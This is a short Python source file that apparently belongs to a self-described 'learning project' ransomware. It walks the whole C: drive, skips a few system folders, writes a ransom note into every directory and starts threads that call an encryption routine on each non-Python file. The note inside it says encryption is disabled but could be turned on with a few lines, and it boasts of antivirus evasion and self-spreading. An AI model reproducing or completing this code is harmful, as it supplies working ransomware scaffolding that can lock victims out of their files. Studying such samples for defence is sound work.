import threading
import os
from .Utils import encrypt,key,encryptor
IGNORE_LIST = {'windows', 'python', 'microsoft', 'system'}

def parse_dir(root, folder):
    """# //TODO: add doc for this whole thing"""
    try:
        msg = f"""  this is a learning project only. if by any case you got injured by this
                        im really sorry, use the key {key} to decrypt, i used fernet in python. {encryptor}.\n'
                        This Project is aimed to show that python can be quite malicious, python easy syntax
                        and readability can provide a nice and comfortable platform to create malicious files
                        with advanced AV Evasion, meta/poly morphic capabilities, self-spreading in network,
                        and c&c communication (although not fully implemented here).
                        python files generated by pyinstaller are generally not much of a interest for modern anti viruses
                        and although one can reverse engineer pyinstaller files, the degree of code discovery is limited
                        by the fact that can do 99% of the things on runtime.
                        for safety measure, i disabled the encrypt function. but if we add here 3-4 lines of easy code
                        this code could encrypt your files."""
        with open(f'{root}/{folder}/fake_ransom_note.txt', 'w+') as q:
            q.write(msg)
        for file in os.listdir(f"{root}/{folder}"):
            if not file.endswith('.py') and not file.endswith('.note.txt') and not file.endswith(
                    '.ThisIsClassHomeworks'):
                threading.Thread(target=encrypt, args=(root, folder, file)).start()
        return 0
    except Exception as e:
        pass


def example_ransom():
    # //TODO: add doc for this whole thing
    for r, d, f in os.walk('c:/'):
        for directory in d:
            if directory.lower() in IGNORE_LIST:
                continue
            else:
                threading.Thread(target=parse_dir, args=(r, directory)).start()
